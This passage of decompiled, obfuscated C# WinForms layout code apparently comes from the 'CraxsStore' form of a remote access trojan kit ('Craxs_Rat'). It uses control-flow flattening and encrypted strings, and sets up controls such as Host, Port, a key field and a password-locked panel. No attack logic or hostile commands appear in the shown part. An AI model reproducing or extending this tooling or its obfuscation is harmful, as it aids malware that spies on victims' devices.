            num1 = (int) num3 * -1240355193 ^ 1754883009;
            continue;
          case 170:
            this.downprogress = new DrakeUIProcessBar();
            num1 = (int) num3 * -459216858 ^ -1517814817;
            continue;
          case 171:
            this.DrakeUITabControl1.TabSelectedColor = Color.Black;
            this.DrakeUITabControl1.TabSelectedForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -420858227 ^ -1410822105;
            continue;
          case 172:
            this.DrakeUIButtonIcon1.Cursor = Cursors.Hand;
            num1 = (int) num3 * 1890837145 ^ 533089079;
            continue;
          case 173:
            this.titletext.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.titletext.Size = new Size(248, 30);
            num1 = (int) num3 * 970341502 ^ 1553903891;
            continue;
          case 174:
            this.DGVSTORE.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            num1 = (int) num3 * 1056534701 ^ -1300284390;
            continue;
          case 175:
            this.downprogress.TabIndex = 2;
            num1 = (int) num3 * 1777210814 ^ 1609076967;
            continue;
          case 176:
            this.workimage.TabIndex = 39;
            num1 = (int) num3 * -509538399 ^ -477503331;
            continue;
          case 177:
            this.Host.Padding = new Padding(5);
            this.Host.Radius = 15;
            num1 = (int) num3 * 1380024674 ^ 1062657592;
            continue;
          case 178:
            this.DrakeUIButtonIcon2.Font = new Font(EXGuarder.\u0034C5F3E79, 9f);
            this.DrakeUIButtonIcon2.Location = new Point(13, 45);
            this.DrakeUIButtonIcon2.Margin = new Padding(4);
            num1 = (int) num3 * 1802722520 ^ 1514231584;
            continue;
          case 179:
            this.Label5.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num3 * 1237847921 ^ -1293752755;
            continue;
          case 180:
            this.Host.Cursor = Cursors.IBeam;
            num1 = (int) num3 * -1696879546 ^ -416683088;
            continue;
          case 181:
            this.statustext.Font = new Font(EXGuarder.\u0034C5F3E79, 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            this.statustext.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.statustext.Location = new Point(0, 780);
            num1 = (int) num3 * -944241527 ^ -1725607513;
            continue;
          case 182:
            this.TheKey.FillColor = Color.Black;
            num1 = (int) num3 * 1824723126 ^ 1519334995;
            continue;
          case 183:
            this.DrakeUIButtonIcon3.Name = EXGuarder.\u0030F65103D;
            num1 = (int) num3 * 880144980 ^ -1472110695;
            continue;
          case 184:
            this.reqbtn.Symbol = 61913;
            this.reqbtn.TabIndex = 2;
            num1 = (int) num3 * -103403950 ^ 1388013756;
            continue;
          case 185:
            this.TheKey.TabIndex = 29;
            num1 = (int) num3 * -1843356313 ^ 581132507;
            continue;
          case 186:
            this.DGVSTORE.AllowUserToResizeRows = false;
            num1 = (int) num3 * 1706270528 ^ 1285736557;
            continue;
          case 187:
            this.b_ok.RectColor = Color.Black;
            num1 = (int) num3 * -1231487212 ^ 1870100746;
            continue;
          case 188:
            gridViewCellStyle1.SelectionBackColor = Color.White;
            num1 = (int) num3 * -576247531 ^ -526896501;
            continue;
          case 189:
            this.showworkbtn.Symbol = 61777;
            this.showworkbtn.SymbolSize = 25;
            num1 = (int) num3 * 1825390448 ^ 801766440;
            continue;
          case 190:
            this.Label8.FlatStyle = FlatStyle.Flat;
            this.Label8.Font = new Font(EXGuarder.\u003214C7825, 18f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 1833698850 ^ 1007688213;
            continue;
          case 191:
            this.b_ok.ForeColor = Color.Black;
            num1 = (int) num3 * -963328479 ^ -585722488;
            continue;
          case 192:
            this.ImageList1.Images.SetKeyName(0, EXGuarder.\u003082D6801);
            num1 = (int) num3 * -1775115949 ^ 1486479100;
            continue;
          case 193:
            this.TabPage2.Location = new Point(0, 40);
            num1 = (int) num3 * 1745044886 ^ -1349238900;
            continue;
          case 194:
            this.Port.StyleCustomMode = true;
            num1 = (int) num3 * -953533491 ^ 1905810550;
            continue;
          case 195:
            this.TabPage1.PerformLayout();
            num1 = (int) num3 * 382948992 ^ 728998453;
            continue;
          case 196:
            gridViewCellStyle2.SelectionBackColor = Color.White;
            num1 = (int) num3 * -49534333 ^ 1179341693;
            continue;
          case 197:
            this.logopic.SizeMode = PictureBoxSizeMode.CenterImage;
            this.logopic.TabIndex = 0;
            this.logopic.TabStop = false;
            num1 = (int) num3 * -2079233421 ^ -591956591;
            continue;
          case 198:
            this.worklog.Cursor = Cursors.IBeam;
            num1 = (int) num3 * 1854164208 ^ -326483479;
            continue;
          case 199:
            this.PictureBox1.Image = (Image) Craxs_Rat.My.Resources.Resources.sstore;
            num1 = (int) num3 * -783522970 ^ 541833671;
            continue;
          case 200:
            this.Panel1.Dock = DockStyle.Top;
            this.Panel1.Location = new Point(0, 0);
            num1 = (int) num3 * 2010839212 ^ 760460030;
            continue;
          case 201:
            this.workpanel.Controls.Add((Control) this.worklabel);
            num1 = (int) num3 * -1801498694 ^ -302410214;
            continue;
          case 202:
            this.checksuper.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num3 * -1680651153 ^ -144168361;
            continue;
          case 203:
            this.exitbtn.FillColor = Color.Black;
            this.exitbtn.FillDisableColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num3 * 179718823 ^ -1421158436;
            continue;
          case 204:
            this.DrakeUITabControl1.FillColor = Color.Black;
            num1 = (int) num3 * 721237072 ^ -915003865;
            continue;
          case 205:
            this.DrakeUIButtonIcon5.RectHoverColor = Color.White;
            this.DrakeUIButtonIcon5.RectPressColor = Color.White;
            this.DrakeUIButtonIcon5.RectSelectedColor = Color.White;
            num1 = (int) num3 * 187477061 ^ 1436251084;
            continue;
          case 206:
            this.DrakeUIButtonIcon4.Margin = new Padding(4);
            this.DrakeUIButtonIcon4.Name = EXGuarder.\u00377393B3B;
            num1 = (int) num3 * -415352518 ^ 503979230;
            continue;
          case 207:
            this.DGVSTORE.ShowCellErrors = false;
            num1 = (int) num3 * 1985073682 ^ -391764637;
            continue;
          case 208:
            this.Label12.Location = new Point(821, 415);
            num1 = (int) num3 * -908945520 ^ -921285257;
            continue;
          case 209:
            this.worklog.TextAlignment = ContentAlignment.TopLeft;
            this.workimage.BackColor = Color.Transparent;
            num1 = (int) num3 * -1165163757 ^ 971151788;
            continue;
          case 210:
            this.ComboPrims.FlatStyle = FlatStyle.Popup;
            num1 = (int) num3 * 1119094346 ^ -242511169;
            continue;
          case 211:
            this.mainpanel.TabIndex = 2;
            num1 = (int) num3 * 856731425 ^ 268475466;
            continue;
          case 212:
            this.DrakeUIImageButton1.Size = new Size(51, 56);
            num1 = (int) num3 * -1623939186 ^ 352706642;
            continue;
          case 213:
            this.Label5 = new Label();
            this.DrakeUIAvatar5 = new DrakeUIAvatar();
            num1 = (int) num3 * 990918138 ^ 725294672;
            continue;
          case 214:
            this.checksuper = new DrakeUICheckBox();
            num1 = (int) num3 * 652521462 ^ 930082335;
            continue;
          case 215:
            this.workimage = new DrakeUIImageButton();
            num1 = (int) num3 * 1989748938 ^ -2099723794;
            continue;
          case 216:
            this.Host.Margin = new Padding(4, 5, 4, 5);
            this.Host.Maximum = (double) int.MaxValue;
            num1 = (int) num3 * 1315796569 ^ 1939340484;
            continue;
          case 217:
            this.Panel3.Controls.Add((Control) this.Label17);
            num1 = (int) num3 * -1180283553 ^ -1986204135;
            continue;
          case 218:
            this.Label10.Font = new Font(EXGuarder.\u0033E1A7215, 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 189104266 ^ 1310309509;
            continue;
          case 219:
            this.Label15.ForeColor = Color.White;
            this.Label15.Location = new Point(0, 0);
            num1 = (int) num3 * -1898609460 ^ 733207048;
            continue;
          case 220:
            this.Port.Location = new Point(922, 118);
            num1 = (int) num3 * 914250522 ^ 1003593501;
            continue;
          case 221:
            gridViewCellStyle2.WrapMode = DataGridViewTriState.True;
            num1 = (int) num3 * -176090793 ^ -662610625;
            continue;
          case 222:
            this.Label15.Name = EXGuarder.\u003442D203C;
            num1 = (int) num3 * 1864280250 ^ -1086822492;
            continue;
          case 223:
            this.strpasstext.Location = new Point(602, 430);
            this.strpasstext.Margin = new Padding(5, 6, 5, 6);
            num1 = (int) num3 * -1542017208 ^ 2095726022;
            continue;
          case 224:
            this.Label9.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num3 * -53277706 ^ 876217120;
            continue;
          case 225:
            this.DrakeUITabControl1.ResumeLayout(false);
            num1 = (int) num3 * -821528056 ^ -1860149006;
            continue;
          case 226:
            this.primname.Name = EXGuarder.\u0033871193F;
            this.primname.ReadOnly = true;
            this.sizeapp.HeaderText = EXGuarder.\u00353770F4E;
            num1 = (int) num3 * -1925866657 ^ 2049968566;
            continue;
          case 227:
            this.DrakeUIButtonIcon1.SymbolSize = 25;
            this.DrakeUIButtonIcon1.TabIndex = 37;
            num1 = (int) num3 * 124894560 ^ 58290383;
            continue;
          case 228:
            this.msgtext.FillColor = Color.Black;
            this.msgtext.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            this.msgtext.ForeColor = Color.White;
            this.msgtext.Location = new Point(802, 569);
            num1 = (int) num3 * -1223514637 ^ -1404201316;
            continue;
          case 229:
            this.Label6.TextAlign = ContentAlignment.MiddleLeft;
            this.Label5.AutoSize = true;
            num1 = (int) num3 * -121294206 ^ -199405188;
            continue;
          case 230:
            this.downprogress.MinimumSize = new Size(70, 23);
            num1 = (int) num3 * 1085474206 ^ -220545258;
            continue;
          case 231:
            this.b_ok.Text = EXGuarder.\u0034C063422;
            this.Panel3.BackColor = Color.FromArgb((int) sbyte.MaxValue, 5, 1);
            num1 = (int) num3 * 215796629 ^ -584048107;
            continue;
          case 232:
            this.Label16.ForeColor = Color.White;
            this.Label16.Location = new Point(591, 367);
            num1 = (int) num3 * -815688803 ^ 1295620016;
            continue;
          case 233:
            gridViewCellStyle5 = new DataGridViewCellStyle();
            num1 = (int) num3 * 707298870 ^ 1916914887;
            continue;
          case 234:
            this.sizeapp.Name = EXGuarder.\u00348141B1E;
            this.sizeapp.ReadOnly = true;
            num1 = (int) num3 * 1215005769 ^ -1952344728;
            continue;
          case 235:
            this.checkautoclick.TabIndex = 52;
            num1 = (int) num3 * 621669542 ^ -1185077154;
            continue;
          case 236:
            this.Label1.Name = EXGuarder.\u0033A2E2977;
            num1 = (int) num3 * -2071143260 ^ 784776190;
            continue;
          case 237:
            this.apdate.HeaderText = EXGuarder.\u003146F143F;
            num1 = (int) num3 * -495407274 ^ -661802920;
            continue;
          case 238:
            this.DrakeUITabControl1.TabIndex = 35;
            num1 = (int) num3 * 2064985622 ^ -426297103;
            continue;
          case 239:
            this.Label3 = new Label();
            num1 = (int) num3 * 1991587655 ^ -1340244408;
            continue;
          case 240:
            this.Port.Size = new Size(228, 30);
            num1 = (int) num3 * 652937160 ^ -999563340;
            continue;
          case 241:
            gridViewCellStyle4 = new DataGridViewCellStyle();
            num1 = (int) num3 * -1465776618 ^ -1814111482;
            continue;
          case 242:
            this.workpanel.SuspendLayout();
            ((ISupportInitialize) this.workimage).BeginInit();
            this.Panel1.SuspendLayout();
            num1 = (int) num3 * 2092465328 ^ 617733081;
            continue;
          case 243:
            this.DrakeUIImageButton1.BackColor = Color.Transparent;
            this.DrakeUIImageButton1.Cursor = Cursors.Default;
            num1 = (int) num3 * 1531639533 ^ -1037260195;
            continue;
          case 244:
            this.Label15.Font = new Font(EXGuarder.\u003715A3F2E, 25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 489391366 ^ 397734829;
            continue;
          case 245:
            this.DrakeUIButtonIcon3.Font = new Font(EXGuarder.\u0034C5F3E79, 9f);
            this.DrakeUIButtonIcon3.Location = new Point(1126, 14);
            this.DrakeUIButtonIcon3.Margin = new Padding(4);
            num1 = (int) num3 * 804634511 ^ 658193290;
            continue;
          case 246:
            this.ToolTips.SetToolTip((Control) this.DrakeUIButtonIcon12, EXGuarder.\u003770E683D);
            this.Panelhome.Controls.Add((Control) this.exitbtn);
            this.Panelhome.Controls.Add((Control) this.reqbtn);
            num1 = (int) num3 * -1983733420 ^ -719727256;
            continue;
          case 247:
            this.Label7.Size = new Size(131, 29);
            this.Label7.TabIndex = 26;
            this.Label7.Text = EXGuarder.\u00336476B4C;
            this.Label4.AutoSize = true;
            num1 = (int) num3 * 1617466293 ^ 1841632607;
            continue;
          case 248:
            this.DrakeUITabControl1.RightToLeft = RightToLeft.No;
            num1 = (int) num3 * -277355485 ^ -1089651955;
            continue;
          case 249:
            this.worklog.Minimum = (double) int.MinValue;
            num1 = (int) num3 * -163009269 ^ 1113372872;
            continue;
          case 250:
            this.Label6.AutoSize = true;
            num1 = (int) num3 * -860107393 ^ 70185253;
            continue;
          case 251:
            this.DrakeUIButtonIcon3.Radius = 25;
            num1 = (int) num3 * -1273265170 ^ -2121501213;
            continue;
          case 252:
            this.DrakeUIButtonIcon5.ForeColor = Color.FromArgb((int) sbyte.MaxValue, 5, 1);
            this.DrakeUIButtonIcon5.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon5.Location = new Point(134, 575);
            this.DrakeUIButtonIcon5.Margin = new Padding(4);
            this.DrakeUIButtonIcon5.Name = EXGuarder.\u003780E6357;
            this.DrakeUIButtonIcon5.Radius = 25;
            num1 = (int) num3 * 809386855 ^ 703869630;
            continue;
          case 253:
            this.Label1.Tag = (object) EXGuarder.\u00311734B49;
            this.Label1.Text = EXGuarder.\u0033F200E43;
            num1 = (int) num3 * 813189482 ^ -1102692137;
            continue;
          case 254:
            this.Timer1 = new System.Windows.Forms.Timer(this.components);
            this.mainpanel = new Panel();
            this.DrakeUITabControl1 = new DrakeUITabControl();
            this.TabPage2 = new TabPage();
            num1 = (int) num3 * -575954077 ^ -1940674165;
            continue;
          case (uint) byte.MaxValue:
            this.DrakeUIButtonIcon3.RectPressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon3.RectSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1208985539 ^ 2094124073;
            continue;
          case 256:
            this.storebtn = new DrakeUIButtonIcon();
            num1 = (int) num3 * 1846460565 ^ 86870652;
            continue;
          case 257:
            this.worklabel.TabIndex = 41;
            this.worklabel.Text = EXGuarder.\u0033A2D0761;
            num1 = (int) num3 * 153859411 ^ 2090815991;
            continue;
          case 258:
            this.DrakeUIButtonIcon2.Name = EXGuarder.\u003354E4758;
            num1 = (int) num3 * -1785638241 ^ -63196636;
            continue;
          case 259:
            this.exitbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.exitbtn.RectDisableColor = Color.FromArgb(20, 20, 20);
            this.exitbtn.Size = new Size(283, 123);
            this.exitbtn.Style = UIStyle.Custom;
            this.exitbtn.Symbol = 62164;
            this.exitbtn.TabIndex = 3;
            this.exitbtn.Text = EXGuarder.\u003770E683D;
            num1 = (int) num3 * 1298124745 ^ 1873100053;
            continue;
          case 260:
            this.Panel3.Controls.Add((Control) this.DrakeUIButtonIcon5);
            this.Panel3.Controls.Add((Control) this.Label13);
            num1 = (int) num3 * -1302980828 ^ -817071097;
            continue;
          case 261:
            this.DrakeUIButtonIcon2.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1122305664 ^ 1040753169;
            continue;
          case 262:
            this.Label12.Text = EXGuarder.\u0034A736849;
            this.Label11.AutoSize = true;
            this.Label11.Font = new Font(EXGuarder.\u0033E1A7215, 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * -1140745521 ^ 1666598357;
            continue;
          case 263:
            this.DrakeUIImageButton1.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            num1 = (int) num3 * -853536011 ^ 1236092468;
            continue;
          case 264:
            this.storebtn.Size = new Size(283, 123);
            num1 = (int) num3 * -1798301090 ^ -1038600700;
            continue;
          case 265:
            this.workpanel.Dock = DockStyle.Fill;
            this.workpanel.Location = new Point(0, 0);
            num1 = (int) num3 * -1917033901 ^ 1404023135;
            continue;
          case 266:
            this.DGVSTORE.AllowUserToDeleteRows = false;
            num1 = (int) num3 * 896872951 ^ 2021865059;
            continue;
          case 267:
            gridViewCellStyle4.BackColor = Color.Black;
            num1 = (int) num3 * -851634612 ^ -2065384920;
            continue;
          case 268:
            this.strpasstext.ForeColor = Color.White;
            num1 = (int) num3 * -172720556 ^ 2058975833;
            continue;
          case 269:
            this.Label9 = new Label();
            this.Label14 = new Label();
            num1 = (int) num3 * -2028579762 ^ 1807858247;
            continue;
          case 270:
            this.Label3.Font = new Font(EXGuarder.\u0033E1A7215, 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            this.Label3.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label3.Location = new Point(424, 84);
            num1 = (int) num3 * 981656748 ^ -627543409;
            continue;
          case 271:
            this.Label2.Name = EXGuarder.\u00335295C3A;
            this.Label2.Size = new Size(53, 29);
            this.Label2.TabIndex = 24;
            num1 = (int) num3 * 1434743124 ^ 1247944422;
            continue;
          case 272:
            this.apdate.ReadOnly = true;
            this.sel.HeaderText = EXGuarder.\u0033B764C52;
            num1 = (int) num3 * 357864369 ^ -520751484;
            continue;
          case 273:
            this.DrakeUIButtonIcon2.FillColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num3 * 1451549502 ^ -614710562;
            continue;
          case 274:
            gridViewCellStyle3.SelectionBackColor = Color.White;
            gridViewCellStyle3.SelectionForeColor = Color.Black;
            gridViewCellStyle3.WrapMode = DataGridViewTriState.True;
            num1 = (int) num3 * 1732789341 ^ 878212797;
            continue;
          case 275:
            this.PictureBox1.TabStop = false;
            this.strpasstext.Cursor = Cursors.IBeam;
            this.strpasstext.FillColor = Color.Black;
            num1 = (int) num3 * 632942010 ^ -522828075;
            continue;
          case 276:
            this.TabPage1.Controls.Add((Control) this.CLiname);
            this.TabPage1.Location = new Point(0, 40);
            num1 = (int) num3 * -1460447809 ^ 227940608;
            continue;
          case 277:
            this.CLiname.TabIndex = 27;
            num1 = (int) num3 * 384587845 ^ 1808198269;
            continue;
          case 278:
            this.CLiname.TextAlignment = ContentAlignment.TopCenter;
            this.TabPage4.BackColor = Color.Black;
            num1 = (int) num3 * 1424228754 ^ -700562899;
            continue;
          case 279:
            this.ComboPrims = new ComboBox();
            num1 = (int) num3 * 181619770 ^ 2082538677;
            continue;
          case 280:
            this.Panelhome.Controls.Add((Control) this.logopic);
            num1 = (int) num3 * -738051745 ^ -2014459763;
            continue;
          case 281:
            this.primname.HeaderText = EXGuarder.\u0035D097313;
            num1 = (int) num3 * 472848172 ^ -920563204;
            continue;
          case 282:
            this.checkautoclick.Size = new Size(61, 29);
            num1 = (int) num3 * -1928167938 ^ -1288695415;
            continue;
          case 283:
            this.Label4.TabIndex = 23;
            num1 = (int) num3 * -971076692 ^ 518019621;
            continue;
          case 284:
            this.workimage.Text = (string) null;
            num1 = (int) num3 * -1665546397 ^ 1947776146;
            continue;
          case 285:
            this.checkautoclick.Cursor = Cursors.Hand;
            num1 = (int) num3 * 1475087237 ^ 396102009;
            continue;
          case 286:
            this.DGVSTORE.EnableHeadersVisualStyles = false;
            num1 = (int) num3 * 113959524 ^ 1433444482;
            continue;
          case 287:
            this.strpasstext.Padding = new Padding(7, 6, 7, 6);
            this.strpasstext.PasswordChar = '●';
            this.strpasstext.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -267613095 ^ 1893535510;
            continue;
          case 288:
            this.Label6.Margin = new Padding(4, 0, 4, 0);
            this.Label6.Name = EXGuarder.\u00307213F70;
            this.Label6.Size = new Size(222, 34);
            this.Label6.TabIndex = 44;
            num1 = (int) num3 * -903979547 ^ 1081429859;
            continue;
          case 289:
            this.Label11.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label11.Location = new Point(833, 535);
            this.Label11.Name = EXGuarder.\u0030C00630A;
            num1 = (int) num3 * 1399082936 ^ 406706860;
            continue;
          case 290:
            this.DrakeUIButtonIcon5.FillHoverColor = Color.FromArgb(20, 20, 20);
            this.DrakeUIButtonIcon5.FillPressColor = Color.Black;
            this.DrakeUIButtonIcon5.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -161465486 ^ 1214443874;
            continue;
          case 291:
            this.PictureBox1.Location = new Point(591, 0);
            num1 = (int) num3 * -1582759250 ^ 705951614;
            continue;
          case 292:
            this.ToolTips.SetToolTip((Control) this.showworkbtn, EXGuarder.\u003590C1528);
            num1 = (int) num3 * -971186932 ^ -733417578;
            continue;
          case 293:
            this.DrakeUIButtonIcon2.TabIndex = 43;
            this.ToolTips.SetToolTip((Control) this.DrakeUIButtonIcon2, EXGuarder.\u0035F304B1D);
            this.DrakeUIButtonIcon4.Cursor = Cursors.Hand;
            this.DrakeUIButtonIcon4.FillColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num3 * -2113964390 ^ 1661324816;
            continue;
          case 294:
            this.DrakeUIButtonIcon1.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * -13785851 ^ -1286288942;
            continue;
          case 295:
            gridViewCellStyle3 = new DataGridViewCellStyle();
            num1 = (int) num3 * -2057260933 ^ 669630765;
            continue;
          case 296:
            this.statustext.Name = EXGuarder.\u00334240A20;
            this.statustext.Size = new Size(1184, 23);
            this.statustext.TabIndex = 1;
            num1 = (int) num3 * -25483372 ^ -1955645746;
            continue;
          case 297:
            this.Label13.Text = EXGuarder.\u0036049045D;
            num1 = (int) num3 * 1467935068 ^ 1958358953;
            continue;
          case 298:
            this.Label2.Font = new Font(EXGuarder.\u0033E1A7215, 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * -427762882 ^ 1283523417;
            continue;
          case 299:
            this.Port.Margin = new Padding(4, 5, 4, 5);
            this.Port.Maximum = (double) int.MaxValue;
            this.Port.Minimum = (double) int.MinValue;
            num1 = (int) num3 * 388231805 ^ -875335180;
            continue;
          case 300:
            this.Panel3.Controls.Add((Control) this.Label15);
            num1 = (int) num3 * -1293724671 ^ -1119897891;
            continue;
          case 301:
            this.DrakeUIButtonIcon4.RectHoverColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon4.RectPressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon4.RectSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -616288070 ^ 1083699883;
            continue;
          case 302:
            this.DrakeUITabControl1.StyleCustomMode = true;
            num1 = (int) num3 * 1432767723 ^ -2030194481;
            continue;
          case 303:
            this.lockpanel.Controls.Add((Control) this.strpasstext);
            this.lockpanel.Controls.Add((Control) this.b_ok);
            this.lockpanel.Controls.Add((Control) this.Panel3);
            this.lockpanel.Dock = DockStyle.Fill;
            num1 = (int) num3 * 953271478 ^ -155315885;
            continue;
          case 304:
            this.TabPage1.Text = EXGuarder.\u0036D1C5249;
            this.checkkill.CheckBoxColor = Color.FromArgb(30, 136, 229);
            this.checkkill.Cursor = Cursors.Hand;
            this.checkkill.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            this.checkkill.Location = new Point(83, 553);
            num1 = (int) num3 * -1927279406 ^ -909647185;
            continue;
          case 305:
            this.msgtext.Maximum = (double) int.MaxValue;
            this.msgtext.Minimum = (double) int.MinValue;
            num1 = (int) num3 * 264746755 ^ 1473049827;
            continue;
          case 306:
            this.DrakeUITabControl1.SizeMode = TabSizeMode.Fixed;
            this.DrakeUITabControl1.Style = UIStyle.Custom;
            num1 = (int) num3 * 2140504094 ^ -495264512;
            continue;
          case 307:
            this.TabPage1.Controls.Add((Control) this.checkDraw);
            this.TabPage1.Controls.Add((Control) this.checkautoclick);
            this.TabPage1.Controls.Add((Control) this.checksuper);
            this.TabPage1.Controls.Add((Control) this.Label9);
            num1 = (int) num3 * -775886278 ^ 679172415;
            continue;
          case 308:
            this.DrakeUIButtonIcon2.RectPressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon2.RectSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1219436608 ^ -464909911;
            continue;
          case 309:
            this.Label16.TextAlign = ContentAlignment.MiddleCenter;
            num1 = (int) num3 * 1371735025 ^ 1883345517;
            continue;
          case 310:
            this.Label11.Size = new Size(217, 29);
            this.Label11.TabIndex = 39;
            num1 = (int) num3 * 1278587661 ^ 1933393052;
            continue;
          case 311:
            this.Panel3.Dock = DockStyle.Left;
            this.Panel3.Location = new Point(0, 0);
            this.Panel3.Name = EXGuarder.\u00362234A6C;
            this.Panel3.Size = new Size(591, 780);
            this.Panel3.TabIndex = 0;
            this.DrakeUIButtonIcon5.BackColor = Color.FromArgb((int) sbyte.MaxValue, 5, 1);
            num1 = (int) num3 * -742157449 ^ 546246704;
            continue;
          case 312:
            this.Label14.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label14.Location = new Point(759, 273);
            num1 = (int) num3 * 1284167624 ^ 264193065;
            continue;
          case 313:
            this.titletext.Maximum = (double) int.MaxValue;
            this.titletext.Minimum = (double) int.MinValue;
            this.titletext.Name = EXGuarder.\u00366701F00;
            this.titletext.Padding = new Padding(5);
            num1 = (int) num3 * 2138435314 ^ 1541909476;
            continue;
          case 314:
            this.apdate = new DataGridViewTextBoxColumn();
            num1 = (int) num3 * 1082378586 ^ -1426733429;
            continue;
          case 315:
            this.Label1.Font = new Font(EXGuarder.\u003214C7825, 18f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * -1610118466 ^ 1389575309;
            continue;
          case 316:
            this.DrakeUIButtonIcon12.Style = UIStyle.Custom;
            this.DrakeUIButtonIcon12.StyleCustomMode = true;
            this.DrakeUIButtonIcon12.Symbol = 61527;
            num1 = (int) num3 * -1337090626 ^ 947615130;
            continue;
          case 317:
            this.Panel1.ResumeLayout(false);
            num1 = (int) num3 * -905074772 ^ 1688519945;
            continue;
          case 318:
            this.worklabel.Location = new Point(192, 57);
            this.worklabel.Name = EXGuarder.\u00352646C60;
            num1 = (int) num3 * -268534524 ^ 1281098118;
            continue;
          case 319:
            this.DrakeUIButtonIcon1.StyleCustomMode = true;
            num1 = (int) num3 * 1893789036 ^ 686893393;
            continue;
          case 320:
            this.Label11.Text = EXGuarder.\u0036A1F5542;
            this.msgtext.Cursor = Cursors.IBeam;
            num1 = (int) num3 * 1017134300 ^ 1955378246;
            continue;
          case 321:
            this.DrakeUITabControl1.Name = EXGuarder.\u00335000C48;
            num1 = (int) num3 * -1358273 ^ -1979705739;
            continue;
          case 322:
            componentResourceManager = new ComponentResourceManager(typeof (CraxsStore));
            this.logopic = new PictureBox();
            this.statustext = new Label();
            num1 = (int) num3 * -1161704779 ^ -920043418;
            continue;
          case 323:
            this.reqbtn.Location = new Point(441, 564);
            this.reqbtn.Name = EXGuarder.\u003450C5D0F;
            num1 = (int) num3 * -510643037 ^ -771459827;
            continue;
          case 324:
            this.showworkbtn.Visible = false;
            num1 = (int) num3 * 655826817 ^ -1772782037;
            continue;
          case 325:
            this.Panel1 = new Panel();
            this.DrakeUIButtonIcon1 = new DrakeUIButtonIcon();
            this.Label1 = new Label();
            this.DrakeUIImageButton1 = new DrakeUIImageButton();
            this.DrakeUIButtonIcon13 = new DrakeUIButtonIcon();
            num1 = (int) num3 * -1628947139 ^ -457030313;
            continue;
          case 326:
            this.Label9.TextAlign = ContentAlignment.MiddleLeft;
            this.Label14.AutoSize = true;
            num1 = (int) num3 * -2069524857 ^ -1615538135;
            continue;
          case 327:
            this.Label13.Dock = DockStyle.Top;
            this.Label13.Font = new Font(EXGuarder.\u0034C5F3E79, 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 644367589 ^ -946671654;
            continue;
          case 328:
            this.DGVSTORE.TabIndex = 1;
            num1 = (int) num3 * 1944414079 ^ 1856997968;
            continue;
          case 329:
            this.Port.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            num1 = (int) num3 * 1120539951 ^ -1655070262;
            continue;
          case 330:
            this.DrakeUIButtonIcon3.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 1371759353 ^ -1855206390;
            continue;
          case 331:
            this.Panelhome.Dock = DockStyle.Fill;
            this.Panelhome.Font = new Font(EXGuarder.\u0034C5F3E79, 16f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            this.Panelhome.Location = new Point(0, 0);
            this.Panelhome.Name = EXGuarder.\u00367654922;
            num1 = (int) num3 * 453229141 ^ 2071782669;
            continue;
          case 332:
            this.Label4 = new Label();
            this.Host = new DrakeUITextBox();
            num1 = (int) num3 * 1678346920 ^ -1442762992;
            continue;
          case 333:
            this.strpasstext.Font = new Font(EXGuarder.\u0034C5F3E79, 9f);
            num1 = (int) num3 * -1066632543 ^ -1191189197;
            continue;
          case 334:
            this.TabPage4.TabIndex = 3;
            this.TabPage4.Tag = (object) EXGuarder.\u00377693C6E;
            num1 = (int) num3 * 11394327 ^ -504220984;
            continue;
          case 335:
            this.Label13.ForeColor = Color.Black;
            this.Label13.Location = new Point(0, 367);
            this.Label13.Name = EXGuarder.\u00313057345;
            num1 = (int) num3 * -172877096 ^ 178196933;
            continue;
          case 336:
            this.DrakeUIButtonIcon4.Radius = 25;
            this.DrakeUIButtonIcon4.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon4.RectDisableColor = Color.FromArgb(227, 242, 253);
